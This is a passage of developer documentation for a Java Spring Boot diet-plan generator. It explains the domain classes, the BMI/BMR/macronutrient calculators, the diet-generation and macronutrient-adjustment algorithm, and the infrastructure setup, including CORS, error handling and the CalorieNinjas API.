First, lets look closer at `Recipe` and `Product` objects and their sub-objects to understood better how fundamental
data is
represented.

### 3.2.1 Product

```java
public class Product {

    private UUID id;
    private String name;
    private Nutrients nutrients;
    private Filler filler;
}
```

[//]: # (![Product Code screenshot]&#40;/screenshots/product_code_ss.png&#41;)

The Product object is depicted as shown in the screenshot. Besides the obvious fields - name and id (1:1 database
representation), there are two important fields - Nutrients and Filler. During database initialization, products are
fetched from CalorieNinjas
and marked with the appropriate filler. Based on this Filler, the DietGenerator decides if a product can be used to
increase or decrease macronutrients. `Nutrients` is representation of calories, carbohydrates, fats and proteins per
100g of the products.

### 3.2.2 Filler

The `Filler` enum is used to mark products to indicate if a product can be used to adjust macronutrients. In this
application
fillers are set up manually for best and controlled result, but algorithm can be implemented to decide if product is
suitable to be a Filler.

```java
public enum Filler {

    PROTEIN(""Protein""),
    FAT(""Fat""),
    CARBOHYDRATE(""Carbohydrate""),
    NONE(""None"");
}
```

[//]: # (![Filler Code screenshot]&#40;/screenshots/filler_code_ss.png&#41;)

### 3.2.3 Nutrients

```java
public class Nutrients {

    private Calories calories;
    private Carbohydrates carbohydrates;
    private Proteins proteins;
    private Fats fats;
}
```

[//]: # (![Nutrients Code screenshot]&#40;/screenshots/nutrients_code_ss.png&#41;)

The `Nutrients` object contains 3 basic public methods - addNutrients, subtractNutrients and createEmptyNutrients. First
two
return void and take another Nutrients object as parameter.
Those one are widely use across the application to perform subtraction and addition of the nutrients. The last method is
static and is used as starting point for new nutrient calculations.

Calories, Carbohydrates, Proteins and Fats are the classes that holds more specific information and are some kind of
wrappers.

Calories:

```java
public class Calories {
    private BigDecimal totalCalories;
}
```

[//]: # (![Calories Code screenshot]&#40;/screenshots/calories_code_ss.png&#41;)

Carbohydrates:

```java
public class Carbohydrates {
    private BigDecimal totalCarbohydrates;
    private BigDecimal fiber;
    private BigDecimal sugar;
}
```

[//]: # (![Carbohydrates Code screenshot]&#40;/screenshots/carbohydrates_code_ss.png&#41;)

Proteins:

```java
public class Proteins {
    private BigDecimal totalProteins;
}
```

[//]: # (![Proteins Code screenshot]&#40;/screenshots/proteins_code_ss.png&#41;)

Fats:

```java
public class Fats {
    private BigDecimal totalFats;
    private BigDecimal saturatedFats;
}
```

[//]: # (![Fats Code screenshot]&#40;/screenshots/fats_code_ss.png&#41;)

Every of those wrappers contain totalValue field and that is actual field that is used to perform calculations. Let's
look at `Fats` wrapper.
It has totalFats and saturatedFats fields. The saturatedFats amount is part of totalFats value and as you can see the ""
normal"" fats are not listed in the structure.
If you want to get the value of fats WITHOUT saturatedFats you need to perform your own
subtraction `totalFats - saturatedFats`. Knowing this may be useful if you decide to implement glycemic load where you
use value of carbohydrates excluding fiber. For now, glycemic load is not supported in this application and this may
change in the future.

### 3.2.4 Recipe

```java
public class Recipe {

    private UUID id;
    private String name;
    private Map<Product, BigDecimal> ingredientsProportion;
    private Nutrients nutrients;
    private BigDecimal basePortionInGrams;
    private boolean isScalable;
    private String howToPrepare;
    private List<DietType> dietTypes;
    private List<MealType> mealTypes;
    private Set<Filler> scalableFillers;
}
```

[//]: # (![Recipe Code screenshot]&#40;/screenshots/recipe_code_ss.png&#41;)

The `Recipe` object that are used to create base dish during diet creation. It has some useful information such as
dietType that indicate for which diet it can be used, mealTypes that indicate for which meal it can be used. The
ingredientsProportion field store the information about percentage ratio of each `Product` in the recipe. This will
guarantee
the same taste of the base portion when ever we decide to create large or small portion. When we adjust the
macronutrients using
product marked as fillers the ingredients ratio will change but the starting point will be always the same.
It also has a `Nutrients` object that represent nutrition information per 100g of the product.

### 3.2.5 MealType

The `MealType` is simple enum that contain supported meals. In `DietGenerator` class, algorithm use it choose
appropriate `Recipe` for requested diet.

```java
public enum MealType {

    BREAKFAST(""Breakfast""),
    LUNCH(""Lunch""),
    DINNER(""Dinner""),
    SNACK(""Snack"");
}
```

[//]: # (![MealType Code screenshot]&#40;/screenshots/mealtype_code_ss.png&#41;)

### 3.2.6 DietType

The `DietType` is simple enum that contain supported diets. In `DietGenerator` class, algorithm use it choose
appropriate `Recipe` for requested diet. Currently, application support only one type: ""High Protein"". This can be very
easily extended. Each `DietType` has its own `MacroCalculator`.

```java
public enum DietType {

    PROTEIN(""High Protein"");
}
```

[//]: # (![MealType Code screenshot]&#40;/screenshots/diettype_code_ss.png&#41;)

### 3.2.7 BigDecimal

In domain application layer, build in Java class `BigDecimal` is used to perform calculation instead of primitive
variables.
This class support basic math operations including very useful rounding by `RoundingMode` enum. Example usage:

```java
    private BigDecimal calculateCarbohydrates(BigDecimal requiredCalories, BigDecimal totalProteins, BigDecimal totalFats) {
    BigDecimal caloriesLeft = requiredCalories
            .subtract(totalProteins.multiply(BigDecimal.valueOf(4)))
            .subtract(totalFats.multiply(BigDecimal.valueOf(9)));
    return caloriesLeft.divide(BigDecimal.valueOf(4), 1, RoundingMode.HALF_UP);
}
```

[//]: # (![BigDecimal Code Usage screenshot]&#40;/screenshots/bigdecimal_code_example_ss.png&#41;)

Presented method is located in `HighProteinMacroCalculator` and contains chain subtraction, multiplication and division.
Note that scale 1 with `RoundingMode.HALF_UP` has been used to round result to 1 decimal place. Result of multiplication
is used as subtrahend for subtraction.

### 3.2.8 Dish

The `Dish` class is final meal representation class and it is result of `DietGenerator`. This class has factory method
that take `Recipe` and amount of
calories that dish has to has. The productsToGram holds the `Product` to actual value in grams required for that dish
as `BigDecimal`.
`Nutrients` object in this class holds the information about the total nutrients information for the whole meal(--->NOT
PER 100g<---). The recipe filed is the recipe that this dish has been created from. The `Dish` class also contains some
methods that are used to adjust macronutrients.

```java
public class Dish {

    private final Map<Product, BigDecimal> productToGrams;
    private final Nutrients nutrients;
    private final Recipe recipe;
    private final Map<Filler, Integer> numberOfFillers;
}
```

[//]: # (![Dish Code screenshot]&#40;/screenshots/dish_code_ss.png&#41;)

### 3.2.9 Diet

The `Diet` class is final diet representation class and it is returned by `DietGenerator` generateDiet method. It
contains list of dishes that are adjusted to the given `Macronutrient`, total `Nutrients` for the whole diet and
shoppingList that is simple name of the product to the amount in grams. The `Diet` class also contains some methods to
adjust macronutrients.

```java
public class Diet {

    private List<Dish> dishes;
    private Nutrients nutrients;
    private Map<String, Double> shoppingList;
}
```

[//]: # (![Diet Code screenshot]&#40;/screenshots/diet_code_ss.png&#41;)

## 3.3 Calculators

The application features three distinct calculators: `BMICalculator`, `BMRCalculator`, and `MacroCalculator`. The first
two, are standalone calculators. The application includes a dedicated controller
`CalculatorController`, with two endpoints to facilitate their use. The third calculator, `MacroCalculator`, is
particularly important as it is used to create the `Macronutrient` object for the `DietGenerator`.

### 3.3.1 BMICalculator

The `BMICalculator` is simple calculator that return BMI value for given parameters. It has only one static default
method calculate that take 2 parameters - bodyWeightInKg and heightInCm.

The BMI formula utilize metric system and is as follows:

`BMI = bodyWeightInKg / heightInMeters^2`

As you can see on the screen, heightInCm is converted to meters.

```java
public interface BMICalculator {

    static BigDecimal calculate(BigDecimal bodyWeightInKg, BigDecimal heightInCm) {
        if (bodyWeightInKg == null || bodyWeightInKg.doubleValue() <= 0 || heightInCm == null || heightInCm.doubleValue() <= 0)
            return BigDecimal.valueOf(0);

        BigDecimal heightInMeters = heightInCm.divide(new BigDecimal(""100""), new MathContext(3, RoundingMode.HALF_DOWN));
        BigDecimal heightSquared = heightInMeters.multiply(heightInMeters, new MathContext(3, RoundingMode.HALF_DOWN));
        return bodyWeightInKg.divide(heightSquared, new MathContext(3, RoundingMode.HALF_UP));
    }
}
```

[//]: # (![BMICalculator Code screenshot]&#40;/screenshots/bmicalculator_code_ss.png&#41;)

### 3.3.2 BMRCalculator

The `BMRCalculator` is an interface with a single method, calculate, which returns a `BaseMetabolicRate` object. This
method
takes one parameter, `BMRAttributes`, and is implemented by the `MifflinStJeorCalculator`. Other equations can also be
implemented using the `BMRCalculator` interface.

```java
public interface BMRCalculator {
    BaseMetabolicRate calculate(BMRAttributes bmrAttributes);
}
```

[//]: # (![BMRCalculator Code screenshot]&#40;/screenshots/bmrcalculator_code_ss.png&#41;)

This application currently support MifflinStJeor equations which is:

Male: `BMR = ( 10 √ó bodyWeightInKg in kg ) + ( 6.25 √ó heightInCm in cm ) ‚àí ( 5 √ó age in years ) + 5`

Female: `BMR=( 10 √ó bodyWeightInKg in kg ) + ( 6.25 √ó heightInCm in cm ) ‚àí ( 5 √ó age in years ) ‚àí 161`

```java
public class MifflinStJeorCalculator implements BMRCalculator {

    @Override
    public BaseMetabolicRate calculate(BMRAttributes bmrAttributes) {
        if (bmrAttributes == null) return new BaseMetabolicRate(BigDecimal.valueOf(0));
        if (bmrAttributes.getGender() == Gender.MALE)
            return calculateUsingMaleEquation(bmrAttributes);
        else return calculateUsingFemaleEquation(bmrAttributes);
    }
}
```

[//]: # (![MifflinCalculator Code screenshot]&#40;/screenshots/mifflinstjeorcalculator_code_ss.png&#41;)

The `BMRAttributes` are presented below:

```java
public class BMRAttributes {
    private BigDecimal bodyWeightInKg;
    private BigDecimal heightInCm;
    private BigDecimal age;
    private ActiveLevel activeLevel;
    private Gender gender;
}
```

[//]: # (![BMRAttributes Code screenshot]&#40;/screenshots/bmrattributes_code_ss.png&#41;)

The `BaseMetabolicRate` object, created by the `MacroCalculator`, contains the actual value and has a single method,
`calculateTDEE`. This method takes one parameter, `ActiveLevel`. Based on the provided activity level, the base
metabolic
rate is multiplied, and the result is returned as a `BigDecimal`.

```java
public class BaseMetabolicRate {
    private BigDecimal BMR;

    public BigDecimal calculateTDEE(ActiveLevel activeLevel) {
        if (activeLevel == null) return BigDecimal.valueOf(0);
        BigDecimal multiplayer = BigDecimal.valueOf(activeLevel.getMultiplayer());
        return multiplayer.multiply(BMR).setScale(2, RoundingMode.HALF_DOWN);
    }
}
```

[//]: # (![BaseMetabolicRate Code screenshot]&#40;/screenshots/basemetabolicrate_code_ss.png&#41;)

The `ActiveLevel` enum is presented below:

```java
public enum ActiveLevel {
    SEDENTARY(1.2),
    LIGHTLY(1.375),
    MODERATELY(1.55),
    VERY(1.725),
    SUPER(1.9);
}
```

[//]: # (![ActiveLevel Code screenshot]&#40;/screenshots/activelevel_code_ss.png&#41;)

### 3.3.3 MacroCalculator

The `MacroCalculator` is a sealed interface with a single method, `calculate`, which returns a `Macronutrient` object
and
takes one parameter, `MacroCalculatorAttributes`. Each `DietType` requires its own `MacroCalculator` implementation, as
each
diet needs a different approach to macronutrients. For example, an average person who doesn't train should not consume
the same amount of protein as someone who engages in three resistance training sessions per week.

```java
public sealed interface MacroCalculator permits HighProteinMacroCalculator {
    Macronutrient calculate(MacroCalculatorAttributes requiredCalories);
}
```

[//]: # (![MacroCalculator Code screenshot]&#40;/screenshots/macrocalculator_code_ss.png&#41;)

The `MacroCalculator` is created by `MacroCalculatorFactory`.

```java
public class MacroCalculatorFactory {
    public static MacroCalculator getMacroCalculator(DietType dietType) {
        return switch (dietType) {
            case PROTEIN -> new HighProteinMacroCalculator();
            default -> throw new WrongInputException(""Unknown diet type"");
        };
    }
}
```

[//]: # (![MacroCalculatorFactory Code screenshot]&#40;/screenshots/macrocalculatorfactory_code_ss.png&#41;)

The `MacroCalculatorAttributes` is simple record that holds necessary information.

```java
public record MacroCalculatorAttributes(BigDecimal requiredCalories, BigDecimal bodyWeightInKg, Gender gender) {
}
```

[//]: # (![MacroCalculator Code screenshot]&#40;/screenshots/macrocalculatorattributes_code_ss.png&#41;)

The `HighProteinMacroCalculator` is the actual implementation of the `MacroCalculator` and uses its own equation.
Macronutrients are calculated in the order of protein, fats, and carbohydrates.

It is essential to note that each gram of protein and carbohydrate equals 4 kcal, and each gram of fat equals 9 kcal.
These values remain consistent across all diet types.

Proteins: `(2.2g MALE or 1.6g FEMALE) x Body Weight`

Fats: `30% of total caloric intake`

Carbohydrates: `Calculated as the remaining calories after proteins and fats`

Example: Male 100kg that requested 3000kcal diet.

Proteins: `2.2 x 100 = 220g` per day that are `220g x 4kcal = 880kcal` of total daily intake.

Fats: `0.3 x 3000kcal = 900kcal` of total daily intake that are `900 / 9kcal = 100g` of fats.

Carbohydrates: `3000 - (880kcal + 900kcal) = 1220kcal` of total daily intake that are `1220 / 4kcal = 305g`of
carbohydrates per day.

```java
public final class HighProteinMacroCalculator implements MacroCalculator {

    @Override
    public Macronutrient calculate(MacroCalculatorAttributes attributes) {
        if (attributes == null || attributes.requiredCalories() == null || attributes.bodyWeightInKg() == null || attributes.gender() == null) {
            return new Macronutrient(BigDecimal.valueOf(0), BigDecimal.valueOf(0), BigDecimal.valueOf(0), BigDecimal.valueOf(0));
        }
        BigDecimal totalProtein = calculateTotalProtein(attributes.bodyWeightInKg(), attributes.gender());
        BigDecimal totalFats = calculateTotalFats(attributes.requiredCalories());
        BigDecimal totalCarbohydrates = calculateCarbohydrates(attributes.requiredCalories(), totalProtein, totalFats);
        return new Macronutrient(attributes.requiredCalories(), totalProtein, totalFats, totalCarbohydrates);
    }
}

```

The `Macronutrient` serves as a holder for calculated values and is used in the `DietGenerator` to determine whether the
values need to be increased or decreased in the diet. It also has two methods, `reduceValues` and `increaseValues`,
which
take `Nutrients` as a parameter.

```java
public class Macronutrient {
    private BigDecimal calories;
    private BigDecimal proteins;
    private BigDecimal fats;
    private BigDecimal carbohydrates;
}
```

[//]: # (![Macronutrient Code screenshot]&#40;/screenshots/macronutrient_code_ss.png&#41;)

## 3.4 Generators

The application has 2 generators - `ShoppingListGenerator` and `DietGenerator`. First one is very simple, where the
second is rather complex.

### 3.4.1 DietGenerator

The `DietGenerator` is an interface with a single method, `generateDiet`, which does not take any parameters and returns
a
`Diet` object. This interface can be implemented to provide a new generator. In the current application, `DietGenerator`
is
implemented by the `DietGeneratorImpl` class, and this section is dedicated to that implementation.

The `DietGeneratorImpl` is an object created separately for each diet and is garbage collected after the request is
completed. To create it, you need `numberOfMeals` as a `BigDecimal`, a `Macronutrient`, and
a `Map<MealType, List<Recipe>>`. In addition to basic initialization in the constructor, 10% of the total requested
calories is reserved for
macronutrient adjustment. The baseCaloriesPerMeal field is created by subtracting the reserved calories from the total
calories and dividing it by numberOfMeals.

`baseCaloriesPerMeal = (totalCalories - (totalCalories * 0.1)) / numberOfMeals`

```java
public class DietGeneratorImpl implements DietGenerator {

    private final Random random;
    private final Map<MealType, List<Recipe>> recipes;
    private final Macronutrient missingMacronutrients;
    private final BigDecimal numberOfMeals;
    private final BigDecimal baseCaloriesPerMeal;


    public DietGeneratorImpl(BigDecimal numberOfMeals, Macronutrient missingMacronutrients, Map<MealType, List<Recipe>> recipes) {
        this.missingMacronutrients = missingMacronutrients;
        this.numberOfMeals = numberOfMeals;
        BigDecimal reservedCalories = missingMacronutrients.getCalories().multiply(BigDecimal.valueOf(0.1));
        BigDecimal requiredCaloriesAfterReservation = missingMacronutrients.getCalories().subtract(reservedCalories);
        this.baseCaloriesPerMeal = requiredCaloriesAfterReservation.divide(numberOfMeals, 2, RoundingMode.DOWN);
        this.random = new Random();
        this.recipes = recipes;
    }
}
```

[//]: # (![DietGeneratorImpl members and constructor Code screenshot]&#40;/screenshots/dietgeneratorfieldconstructor_code_ss.png&#41;)

After the `DietGeneratorImpl` is created, it contains all the necessary information to generate the diet. This includes
a
lists of `Recipe` for each `MealType`, the required `Macronutrient`, the
requested `numberOfMeals`, `baseCaloriesPerMeal`, and a
`Random` object for later usage.

```java

@Override
public Diet generateDiet() {
    Diet diet = new Diet();
    addDishes(diet);
    adjustMacronutrients(diet);
    diet.setShoppingList(ShoppingListGenerator.generateShoppingList(diet));
    return diet;
}
```

[//]: # (![DietGeneratorImpl generate Code screenshot]&#40;/screenshots/dietgeneratorgenerate_code_ss.png&#41;)

There are three main steps in diet creation, `addDishes`, `adjustMacronutrients` and `generateShoppingList`.

The `addDishes` method:

```java
    private void addDishes(Diet diet) {
    addDish(diet, MealType.BREAKFAST);
    for (int i = 1; i < numberOfMeals.doubleValue() - 1; i++) {
        if (i == 3) {
            addDish(diet, MealType.SNACK);
            continue;
        }
        addDish(diet, MealType.LUNCH);
    }
    addDish(diet, MealType.DINNER);
}
```

[//]: # (![DietGeneratorImpl addDishes Code screenshot]&#40;/screenshots/adddishesmethod_code_ss.png&#41;)

The diet plan is populated with specific meal types based on the requested number of meals:

- First Meal: Always Breakfast
- Last Meal: Always Dinner
- Fourth Meal (if applicable): Snack
- Middle Meals: Lunch-type meals

Random `Recipe` is picked from the list of given `MealType` to create a `Dish` and then added to the `Diet` object.
The `Dish` is created
using
static factory method. The nutrients information and required products in grams are calculated from given `Recipe`
and `baseCaloriesPerMeal`.
As `Recipe` holds `Nutrients` information per 100g of the products, `totalCalories` are divided by `baseCaloriesPerMeal`
to create the factor.
This factor is multiplied by each product proportion value to get the actual required grams of the product.

```java
    public static Dish createDish(Recipe recipe, BigDecimal requiredCalories) {
    BigDecimal recipeTotalCalories = recipe.getNutrients().getCalories().getTotalCalories();
    BigDecimal factor = requiredCalories.divide(recipeTotalCalories, 3, RoundingMode.HALF_UP);
    Map<Product, BigDecimal> emptyRecipeToGram = new HashMap<>();
    recipe.getIngredientsProportion().forEach(((product, proportion) -> {
        emptyRecipeToGram.put(product, proportion.multiply(factor));
    }));
    return new Dish(emptyRecipeToGram, recipe);
}
```

[//]: # (![Dish createDish Code screenshot]&#40;/screenshots/dishcreate_code_ss.png&#41;)

It is important to note that immediately after a `Dish` is added to the `Diet`, the macronutrients in
the `Macronutrient`
object are reduced by the total `Nutrients` value of the generated `Dish`. Once all requested dishes are added to
the `Diet`,
the `Macronutrient` object retains its `calories` field as 10% of the total requested calories, which is our reserved
calories value. The remaining fields ‚Äî `proteins`, `fats`, and `carbohydrates` ‚Äî are incorrect.

`Recipe` objects have strictly defined percentage ratios of `Product`, making it impossible to create a perfectly
macronutrient-balanced diet plan with randomly chosen recipes. While we can control the calories, the
specific macronutrient values must be adjusted accordingly.

The `adjustMacronutrients` method:

```java
   private void adjustMacronutrients(Diet diet) {
    int numberOfLoops = 3;
    for (int i = 0; i < numberOfLoops; i++) {
        if (missingMacronutrients.getCarbohydrates().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.CARBOHYDRATE, missingMacronutrients.getCarbohydrates().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.CARBOHYDRATE, missingMacronutrients.getCarbohydrates(), missingMacronutrients);

        if (missingMacronutrients.getFats().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.FAT, missingMacronutrients.getFats().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.FAT, missingMacronutrients.getFats(), missingMacronutrients);

        if (missingMacronutrients.getProteins().doubleValue() < 0)
            diet.reduceMacronutrient(Filler.PROTEIN, missingMacronutrients.getProteins().abs(), missingMacronutrients);
        else
            diet.increaseMacronutrient(Filler.PROTEIN, missingMacronutrients.getProteins(), missingMacronutrients);
    }
}
```

[//]: # (![DietGenerator adjustMacronutrient Code screenshot]&#40;/screenshots/adjustmacronutrient_code_ss.png&#41;)

This method check `Macronutrient`'s `carbohydrates`, `fats` and `proteins` fields. If the value is negative it means
there
is too much of the given macronutrient in the diet, if the value is positive it means there are missing macronutrient in
the diet and respectively `reduceMacronutrient` and `increaseMacronutrient` method are called on `Diet` object using
those offsets. Target
is to bring those values as close to 0 as possible.

As you can see on the screen, this operation is performed 3 times. It has to be done to generate diet accurately.
Each of missing macronutrients is adjusted separately, once we set our carbohydrates then during fats adjustment we may
break carbohydrates amount in the diet. Let's assume that we want to add 20g proteins to the diet, algorithm look for
all `Product` marked with `Filler.PROTEIN` and add calculated amount of those products to satisfy missing 20g of
proteins. Unfortunately, very likely this method is going to add also some carbohydrates and fats with those products.

Every iteration required macronutrients that need to be adjusted are closer to the 0 and three iterations is sufficient.

```java
    public void reduceValues(Nutrients nutrients) {
    setCalories(calories.subtract(nutrients.getCalories().getTotalCalories()));
    setProteins(proteins.subtract(nutrients.getProteins().getTotalProteins()));
    setFats(fats.subtract(nutrients.getFats().getTotalFats()));
    setCarbohydrates(carbohydrates.subtract(nutrients.getCarbohydrates().getTotalCarbohydrates()));
}

public void increaseValues(Nutrients nutrients) {
    setCalories(calories.add(nutrients.getCalories().getTotalCalories()));
    setProteins(proteins.add(nutrients.getProteins().getTotalProteins()));
    setFats(fats.add(nutrients.getFats().getTotalFats()));
    setCarbohydrates(carbohydrates.add(nutrients.getCarbohydrates().getTotalCarbohydrates()));
}
```

[//]: # (![Diet increase macro Code screenshot]&#40;/screenshots/increasemacro_code_ss.png&#41;)

Those method first look for `Dish` in the `Diet` object that can be scaled with the given `Filler`. Then the amount of
requested grams are distributed uniformly across the all suitable dishes and `Product`s in those `Dish`es by
calling `increaseFiller` or `reduceFiller`
methods.

Mentioned methods perform similar operation, but they iterate over `Product` list in the `Dish` and also updates
its own `Nutrients` to correct the changes.
The difference in `Nutrients` is returned and subtracted or added from `Macronutrient` object.

The `increaseFiller` method:

```java
public Nutrients increaseFiller(Filler filler, BigDecimal grams) {
    Nutrients totalAddedNutrients = Nutrients.createEmptyNutrients();
    if (grams == null || filler == null || filler == Filler.NONE || grams.doubleValue() <= 0) {
        return totalAddedNutrients;
    }

    Integer fillerPopulation = numberOfFillers.get(filler);
    if (fillerPopulation == null) return totalAddedNutrients;

    BigDecimal numberOfProductFillers = BigDecimal.valueOf(fillerPopulation);
    if (recipe.isScalable() && numberOfProductFillers.doubleValue() > 0) {
        BigDecimal gramsFraction = grams.divide(numberOfProductFillers, 2, RoundingMode.HALF_DOWN);
        productToGrams.forEach(((product, bigDecimal) -> {
            if (product.getFiller().equals(filler)) {
                BigDecimal currentGrams = productToGrams.get(product);
                BigDecimal productGramsToAdd = product.calculateProductGramsForRequiredFiller(filler, gramsFraction);
                productToGrams.put(product, currentGrams.add(productGramsToAdd));
                Nutrients subtractedNutrients = product.calculateNutrients(productGramsToAdd);
                nutrients.addNutrients(subtractedNutrients);
                totalAddedNutrients.addNutrients(subtractedNutrients);
            }
        }));
    }
    return totalAddedNutrients;
}
```

[//]: # (![Dish increaseFiller Code screenshot]&#40;/screenshots/increasefiller_code_ss.png&#41;)

The `reduceFiller` method:

```java
public Nutrients reduceFiller(Filler filler, BigDecimal grams) {
    Nutrients totalReducedNutrients = Nutrients.createEmptyNutrients();
    if (grams == null || filler == null || grams.doubleValue() <= 0 || filler == Filler.NONE) {
        return totalReducedNutrients;
    }

    Integer fillerPopulation = numberOfFillers.get(filler);
    if (fillerPopulation == null) return totalReducedNutrients;

    BigDecimal numberOfProductFillers = BigDecimal.valueOf(fillerPopulation);
    if (recipe.isScalable() && numberOfProductFillers.doubleValue() > 0) {
        BigDecimal gramsFraction = grams.divide(numberOfProductFillers, 2, RoundingMode.HALF_DOWN);

        Map<Product, BigDecimal> fillersToGrams = productToGrams.entrySet().stream()
                .filter(entry -> entry.getKey().getFiller().equals(filler))
                .collect(Collectors.toMap(
                        Map.Entry::getKey,
                        Map.Entry::getValue));

        fillersToGrams.forEach(((product, currentGrams) -> {
            BigDecimal productGramsToRemove = product.calculateProductGramsForRequiredFiller(filler, gramsFraction);
            if (currentGrams.subtract(productGramsToRemove).doubleValue() > 0) {
                productToGrams.put(product, currentGrams.subtract(productGramsToRemove));
                Nutrients subtractedNutrients = product.calculateNutrients(productGramsToRemove);
                nutrients.subtractNutrients(subtractedNutrients);
                totalReducedNutrients.addNutrients(subtractedNutrients);
            }
        }));
    }
    return totalReducedNutrients;
}
```

[//]: # (![Dish reduceFiller Code screenshot]&#40;/screenshots/reducefiller_code_ss.png&#41;)

### 3.4.2 ShoppingListGenerator

The `ShoppingListGenerator` is a simple interface with one default method that generates a `Map<String, Double>` of
product names to values
in grams for the entire diet. It requires only one parameter, which is `Diet`.

```java
public interface ShoppingListGenerator {

    static Map<String, Double> generateShoppingList(Diet diet) {
        Map<String, Double> shoppingList = new HashMap<>();

        diet.getDishes().forEach((dish -> {
            dish.getProductToGrams().forEach((product, grams) -> {
                Double currentValue = shoppingList.get(product.getName());
                double valueToAdd = grams.setScale(1, RoundingMode.HALF_UP).doubleValue();
                if (currentValue != null) {
                    valueToAdd += currentValue;
                }
                shoppingList.put(product.getName(), valueToAdd);
            });
        }));
        return shoppingList;
    }
}
```

[//]: # (![ShoppingListGenerator Code screenshot]&#40;/screenshots/shoppinglistgenerator_code_ss.png&#41;)

# 4. Application

The application layer contains actual business logic and usage of domain layer. It orchestrates use cases, and indicate
interfaces that need to be implemented to provide correct functionality of the application. It is important to note
here, that
this layer, same as domain layer, is free from frameworks and libraries.

## 4.1 Repositories

The application require access to database to obtain information about recipes and products. Those database usage is
dictated by interfaces exposed in this layer. As application layer is not depended on actual infrastructure layer, it
doesn't care about what kind of database will provide that information. The only requirement is that those interfaces
need to be implemented correctly in infrastructure layer.

The `ProductRepository`:

```java
public interface ProductRepository {

    Product save(Product product);

    Product getProduct(String productName);

    Product getProduct(UUID uuid);

}
```

The `RecipeRepository` :

```java
public interface RecipeRepository {

    Recipe save(Recipe recipe);

    List<Recipe> findAllByDietAndMealTypes(DietType dietType, MealType mealType);

    List<Recipe> findByName(String name);

}
```

## 4.2 Use Cases

The use cases are actual usage of domain layer, should contain only one concrete business usage of application. From
code perspective, it has to have only one public method, but can have unlimited private methods.

To keep this layer free from framework and libraries, those use cases need to be registered in `BeanConfiguration` class
in infrastructure layer.
That allows them to be injected in presentation layer in controllers. See infrastructure layer documentation to discover
details.

The implementation of `CalculateBMIUseCase` and `CalculateTDEEUseCase` is quite simple and straightforward and consist
of actual calculator method call.

The `CalculateDietUseCase` is interesting use case. This class need to actually use the logic created in domain layer.
It is next layer of abstraction, none of low level implementation is presented here. Only actual usage.

```java

@Override
public Diet createDiet(DietAttributes dietAttributes) {

    Macronutrient macronutrient = calculateMacronutrients(dietAttributes);
    Map<MealType, List<Recipe>> allRecipes = getAllSegregatedRecipes(dietAttributes.dietType());

    DietGenerator dietGeneratorImpl = new DietGeneratorImpl(
            dietAttributes.numberOfMeals(),
            macronutrient,
            allRecipes);

    return dietGeneratorImpl.generateDiet();
}
```

First `Macronutrient` is calculated using private method where `MacroCalculator` is created
using `MacroCalculatorFactory`.

```java
private Macronutrient calculateMacronutrients(DietAttributes dietAttributes) {
    MacroCalculator macroCalculator = MacroCalculatorFactory.getMacroCalculator(dietAttributes.dietType());
    MacroCalculatorAttributes macroCalculatorAttributes = new MacroCalculatorAttributes(
            dietAttributes.requiredCalories(),
            dietAttributes.bodyWeightInKg(),
            dietAttributes.gender());
    return macroCalculator.calculate(macroCalculatorAttributes);
}
```

Next, the list of `Recipes` is fetched from the database and segregated by the `MealType` and stored in the `Map`.
Once all data is gathered to perform diet generation, the `DietGeneratorImpl` object is created and method generateDiet
is used to create `Diet`.
Rest logic happened in the generator class itself and ready object is returned to the presentation layer where is mapped
to the `Response` and returned to the user.

# 5. Infrastructure

---


In the infrastructure layer, we find all configurations, external API integrations, and persistence connections. This
application currently uses the Spring Boot 3 framework, so all configurations related to Spring will be kept in this
layer. In addition to the framework, the application utilizes a MongoDB database and the CalorieNinjas external API to
populate Products.

## 5.1 Spring Boot configuration

### 5.1.1 Bean Configuration

The application uses a clean architecture approach, meaning that the domain and application layers must be kept separate
from framework dependencies. As mentioned in the architecture documentation, there is a specific way to achieve this. We
need to register `UseCases` classes from the application layer with `@Bean` in the `@Configuration` layer. This allows
us to
inject these classes into other components within the application while keeping domain and application layers framework
free.

Since the application is relatively small, the configuration file is also small.

Here is a sample `@Bean` registration method:

```java

@Configuration
public class BeanConfiguration {

    @Bean
    public CreateDiet dietService(RecipeRepository recipeRepository) {
        return new CreateDietUseCase(recipeRepository);
    }
}
```

[//]: # (![Bean registration screenshot]&#40;/screenshots/bean_registration_ss.png&#41;)

### 5.1.2 Cors Configuration

Cross-Origin Resource Sharing (CORS) is a security feature implemented by web browsers that allows or restricts web
pages from making requests to a different domain than the one that served the web page. This is done to prevent
potentially malicious websites from accessing sensitive data on other sites without the user's knowledge.

To allows users utilize this application from the browser, cors configuration need to be implemented.
The application has presentation Single-Page Application and endpoints are exposed by Spring MVC, the basic config is
provided. It is highly
recommended to
adjust these settings for your needs.

```java

@Configuration
public class CorsConfiguration {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping(""/api/**"")
                        .allowedHeaders(""GET"", ""POST"")
                        .allowedOrigins(""*"")
                        .allowedHeaders(""*"");
            }
        };
    }

}
```

[//]: # (![CORS config screenshot]&#40;/screenshots/cors_config_ss.png&#41;)

### 5.1.3 Error Handling

When ever error is thrown in the application, we can catch it and return custom response to the user.
To achieve this, application utilize `@ControllerAdvice` component and register errors to be handled in this class. In
all cases `ExceptionResponse` dto is returned to the user with message, date and description. See presentation layer for
details about dto.

```java

@ControllerAdvice
public class GlobalExceptionHandler extends ResponseEntityExceptionHandler {

    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity<ExceptionResponse> handleIllegalArgumentException(
            ResourceNotFoundException exception, WebRequest webRequest) {

        ExceptionResponse errorDto = new ExceptionResponse(
                exception.getMessage(),
                new Date(),
                webRequest.getDescription(false));

        return new ResponseEntity<>(errorDto, HttpStatus.NOT_FOUND);
    }
}
```

[//]: # (![GlobalExceptionHandler config screenshot]&#40;/screenshots/global_exception_handler_ss.png&#41;)

## 5.2 Calories Ninjas

This application leverages the CalorieNinjas external API to gather information about `Products`. CalorieNinjas offers a
straightforward registration process and user-friendly endpoints. The free tier allows for up to 10,000 requests per
month.

During application startup, the database is populated using data from CalorieNinjas. If a product is already present in
the database, the API call is skipped to optimize performance and reduce unnecessary requests.

The `Products` to fetch are indicated in the `recipe.txt` list in the resources' folder. The `RecipeInit` class is the
parser for that list, and it uses `NinjaService` where `NinjaApi` class is injected.
Special format need to be kept if you decide to extend that list.

